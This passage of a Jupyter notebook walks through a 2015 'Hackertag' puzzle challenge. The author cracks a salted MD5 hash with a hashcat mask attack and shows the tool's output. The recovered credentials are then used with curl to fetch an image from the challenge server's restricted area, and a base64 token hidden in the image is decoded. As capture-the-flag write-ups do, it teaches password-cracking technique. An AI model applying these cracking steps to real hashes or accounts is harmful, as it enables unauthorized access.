        "ddddddddddddddxNMW0ddddxddOWMNkddkKNWNXXXXWMWOdONMKxdddddxxxdxXMMNKXMWKxdddxdxKMMKddONMMMWOddKMMMMKxdkWMKddxO0000000XWMMMMMMMMMWNK00000000000Okxdxdlc:;;;cXMMMMMM\r\n",
        "ddddddddddddddxNMW0dddddddOWMNkxxKMMKxddxONMWOdxXMNkddxxk00OdxXMMKdxXWMXkxdxdxKMMKddONMMMWOddKMMMMKxdkWMXxdxXMMMMMMMMMMMMMMMMMMMMMWN00000000O00O0WMMMMMWWMMMMMMMM\r\n",
        "ddddddddddddddxNMW0dddddddOWMNkdd0WMN000KXWMWOddkNWNK00KNMNOdxXMMKddx0NMW0xddxKMMKddONMMMWOddKMMMMKxdkWMMKkxk0KKK0OKWMMMMMMMMMMMMMMWK000000000KWNWMMMMMMMMMMMMMMM\r\n",
        "ddddddddddddddx0KKkdddddddkKK0kdxxOKXNXXOx0KKOdddx0KXNNXK0kddxOKKOdxddkKKKkxdxKMMN00KWMMMMK00XMMMMN0OKWMMMWX0OkkOO0XWMMMMMMMMMMMMMMWK000000000NMMMMMMMMMMMMMMMMMM\r\n",
        "ddddddddddddddddddddddddddddddddxddxxxxxddddddddddddxxxxddddddddxddddddddddddxKMMMMMMMMMMMMMMMWXXNNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWK000000000WMMMMMMMMMMMMMMMMMM\r\n",
        "ddddddddddddddx0kxdkOOxddddddddddddddddddddddddddddddddddddddddddddddddddddddxKMMMMMMMMMMMMMMWK0000KWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMX00000000KWMMMMMMMMMMMMMMMMMM\r\n",
        "ddddddddddddddxOkxkNX0xddxxxddxxxddxxxxddxxxdxxxxdddddxxxxdxdxxxxddxxxxxxddddxKMMMMMMMMMMMMMMN000000KXNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMW00000KK0d:cdKWMMMMMMMMMMMMMM\r\n",
        "ddddddddddddddkXOkKWX0xxdkKKxd0Kkx0XKKKOxOXkdkXKxdddx0KKKKOxOKKKKOxOXKKXXkdddxKMMMMMMMMMMMMMMMWNNXK00c'ckNMMMMMMMMMMMMMMMMMMMMMMMMMMMNKKXXXx,.....:kNMMMMMMMMMMMM\r\n",
        "ddddddddddddddkN0dON0xdddxONOkX0xON0xxKNk0NOdkNXxdddON0xk0Oxk0OOXXx0NOx0WKxddxKMMMMMMMMMMMMMMMMMMMMNk,...;dKWMMMMMMMMMMMMMMMMMMMMMMMMNKO0Kd.........;0WMMMMMMMMMM\r\n",
        "ddddddddddddddkN0dON0xddddx0XKXkxONOxxKNk0NOdkNXxdddONOxxOkkXXO0NXx0NkdOWKxddxKMMMMMMMMMMMMMMMMMMMMMMNOo:...cxKWMMMMMMMMMMMMMMMWNKkoc;ckol:'..........ckKNWMMMMMM\r\n",
        "ddddddddddddddkXOdkX0xdddddkNWOddx0XKXXOxxKXKKNKxddxx0XKXXOkKXKKXKx0XkdONKxddxKMMMMMMMMMMMMMMMMMMMMMMMMMWKxc...:ONMMMMMMMMWXOdl;.......'..,clc,..........':dOKWMM\r\n",
        "ddddddddddddddxxxxxxxddddxk0X0xddddxxxxdddxxxxxxxddddxxxxxdxxxxxxxxxxxdxxxdddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXOd;.':dkkxoc;,......';:ldkOOo,.';lol:,'..........,co\r\n",
        "dddddddddddddddddddddddddxkkxddddddddddddddddddddddddddddddddddddddddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKxc'.....',:lox0XNWMMMMMMMNo,..';odddol:;,,,,'...\r\n",
        "dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNKOO0KNWWMMMMMMMMMMMMMMMMNOc'..,:ldxdddddddooo\r\n",
        "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWK:....;oddddxxdxxK\r\n",
        "\r\n",
        "*********************************************************\r\n",
        "Der folgende Hashwert (MD5) wurde mit dem Salt \"Hackertag\" erzeugt. \r\n",
        "Der Aufruf war dabei wie folgt: echo -n \"Hackertag{Passwort}\" | md5sum\r\n",
        "\r\n",
        "d79a2543ddbb8042a6d14851fb098e0d\r\n",
        "\r\n",
        "*********************************************************\r\n"
       ]
      }
     ],
     "prompt_number": 105
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "![hackertag](http://dl.dornea.nu/img/2015/hackertag/61fe1a8df134387a58b7790a891c8443.png)\n",
      "\n",
      "What it basically says, is that a certain MD5 hash was created using `echo -n \"Hackertag{Password}\"`, where `Hackertag` is a salt. And given the hash I should find out the right password. I have never used `hashcat` before but this was the right time to do it. After reading some docs, I was able to get the right password in ca. 3 seconds :)"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "%%bash\n",
      "echo \"d79a2543ddbb8042a6d14851fb098e0d\" > hash\n",
      "hashcat -m 0 --attack-mode 3 hash 'Hackertag?l?l?l?l?l?l'"
     ],
     "language": "python",
     "metadata": {
      "scrolled": true
     },
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "Initializing hashcat v0.49 with 2 threads and 32mb segment-size...\n",
        "\n",
        "Added hashes from file hash: 1 (1 salts)\n",
        "Activating quick-digest mode for single-hash\n",
        "\n",
        "NOTE: press enter for status-screen\n",
        "\n",
        "\n",
        "Input.Mode: Mask (H) [1]\n",
        "Index.....: 0/1 (segment), 1 (words), 0 (bytes)\n",
        "Recovered.: 0/1 hashes, 0/1 salts\n",
        "Speed/sec.: - plains, - words\n",
        "Progress..: 1/1 (100.00%)\n",
        "Running...: --:--:--:--\n",
        "Estimated.: --:--:--:--\n",
        "\n",
        "\n",
        "Input.Mode: Mask (Ha) [2]\n",
        "Index.....: 0/1 (segment), 1 (words), 0 (bytes)\n",
        "Recovered.: 0/1 hashes, 0/1 salts\n",
        "Speed/sec.: - plains, - words\n",
        "Progress..: 1/1 (100.00%)\n",
        "Running...: --:--:--:--\n",
        "Estimated.: --:--:--:--\n",
        "\n",
        "\n",
        "Input.Mode: Mask (Hac) [3]\n",
        "Index.....: 0/1 (segment), 1 (words), 0 (bytes)\n",
        "Recovered.: 0/1 hashes, 0/1 salts\n",
        "Speed/sec.: - plains, - words\n",
        "Progress..: 1/1 (100.00%)\n",
        "Running...: --:--:--:--\n",
        "Estimated.: --:--:--:--\n",
        "\n",
        "\n",
        "Input.Mode: Mask (Hack) [4]\n",
        "Index.....: 0/1 (segment), 1 (words), 0 (bytes)\n",
        "Recovered.: 0/1 hashes, 0/1 salts\n",
        "Speed/sec.: - plains, - words\n",
        "Progress..: 1/1 (100.00%)\n",
        "Running...: --:--:--:--\n",
        "Estimated.: --:--:--:--\n",
        "\n",
        "\n",
        "Input.Mode: Mask (Hacke) [5]\n",
        "Index.....: 0/1 (segment), 1 (words), 0 (bytes)\n",
        "Recovered.: 0/1 hashes, 0/1 salts\n",
        "Speed/sec.: - plains, - words\n",
        "Progress..: 1/1 (100.00%)\n",
        "Running...: --:--:--:--\n",
        "Estimated.: --:--:--:--\n",
        "\n",
        "\n",
        "Input.Mode: Mask (Hacker) [6]\n",
        "Index.....: 0/1 (segment), 1 (words), 0 (bytes)\n",
        "Recovered.: 0/1 hashes, 0/1 salts\n",
        "Speed/sec.: - plains, - words\n",
        "Progress..: 1/1 (100.00%)\n",
        "Running...: --:--:--:--\n",
        "Estimated.: --:--:--:--\n",
        "\n",
        "\n",
        "Input.Mode: Mask (Hackert) [7]\n",
        "Index.....: 0/1 (segment), 1 (words), 0 (bytes)\n",
        "Recovered.: 0/1 hashes, 0/1 salts\n",
        "Speed/sec.: - plains, - words\n",
        "Progress..: 1/1 (100.00%)\n",
        "Running...: --:--:--:--\n",
        "Estimated.: --:--:--:--\n",
        "\n",
        "\n",
        "Input.Mode: Mask (Hackerta) [8]\n",
        "Index.....: 0/1 (segment), 1 (words), 0 (bytes)\n",
        "Recovered.: 0/1 hashes, 0/1 salts\n",
        "Speed/sec.: - plains, - words\n",
        "Progress..: 1/1 (100.00%)\n",
        "Running...: --:--:--:--\n",
        "Estimated.: --:--:--:--\n",
        "\n",
        "\n",
        "Input.Mode: Mask (Hackertag) [9]\n",
        "Index.....: 0/1 (segment), 1 (words), 0 (bytes)\n",
        "Recovered.: 0/1 hashes, 0/1 salts\n",
        "Speed/sec.: - plains, - words\n",
        "Progress..: 1/1 (100.00%)\n",
        "Running...: --:--:--:--\n",
        "Estimated.: --:--:--:--\n",
        "\n",
        "\n",
        "Input.Mode: Mask (Hackertag?l) [10]\n",
        "Index.....: 0/1 (segment), 26 (words), 0 (bytes)\n",
        "Recovered.: 0/1 hashes, 0/1 salts\n",
        "Speed/sec.: - plains, - words\n",
        "Progress..: 26/26 (100.00%)\n",
        "Running...: --:--:--:--\n",
        "Estimated.: --:--:--:--\n",
        "\n",
        "\n",
        "Input.Mode: Mask (Hackertag?l?l) [11]\n",
        "Index.....: 0/1 (segment), 676 (words), 0 (bytes)\n",
        "Recovered.: 0/1 hashes, 0/1 salts\n",
        "Speed/sec.: - plains, - words\n",
        "Progress..: 676/676 (100.00%)\n",
        "Running...: --:--:--:--\n",
        "Estimated.: --:--:--:--\n",
        "\n",
        "\n",
        "Input.Mode: Mask (Hackertag?l?l?l) [12]\n",
        "Index.....: 0/1 (segment), 17576 (words), 0 (bytes)\n",
        "Recovered.: 0/1 hashes, 0/1 salts\n",
        "Speed/sec.: - plains, - words\n",
        "Progress..: 17576/17576 (100.00%)\n",
        "Running...: --:--:--:--\n",
        "Estimated.: --:--:--:--\n",
        "\n",
        "d79a2543ddbb8042a6d14851fb098e0d:Hackertagblue\n",
        "\n",
        "All hashes have been recovered\n",
        "\n",
        "Input.Mode: Mask (Hackertag?l?l?l?l) [13]\n",
        "Index.....: 0/1 (segment), 456976 (words), 0 (bytes)\n",
        "Recovered.: 1/1 hashes, 1/1 salts\n",
        "Speed/sec.: - plains, 5.03M words\n",
        "Progress..: 296192/456976 (64.82%)\n",
        "Running...: --:--:--:--\n",
        "Estimated.: --:--:--:--\n",
        "\n",
        "Started: Wed Mar 18 21:45:47 2015\n",
        "Stopped: Wed Mar 18 21:45:47 2015\n"
       ]
      }
     ],
     "prompt_number": 107
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "We can verify that:"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!echo -n \"Hackertagblue\" | md5sum"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "d79a2543ddbb8042a6d14851fb098e0d  -\r\n"
       ]
      }
     ],
     "prompt_number": 108
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Perfect! Now we can use the passwort to access this link: http://82.195.79.41/restricted/index.php. Inside you'll see a image and nothing more:\n",
      "   \n",
      "![hackertag](http://dl.dornea.nu/img/2015/hackertag/dc0eb3cacc8696cdbaa8604bfb89e25e.png)\n"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "But again let's have a look at the image itself:"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "%%bash\n",
      "curl --user freddy:blue http://82.195.79.41/restricted/tour.jpg -o tour.jpg 2> /dev/null\n",
      "strings tour.jpg | grep \"==\""
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "VG9rZW46IDU1MTI0Mw==\n"
       ]
      }
     ],
     "prompt_number": 117
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "That looks interesting:"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!echo \"VG9rZW46IDU1MTI0Mw==\" | base64 -d"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "Token: 551243"
       ]
      }
     ],
     "prompt_number": 119
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "That's it! :)"
     ]
    }
   ],
   "metadata": {}
  }
 ]
}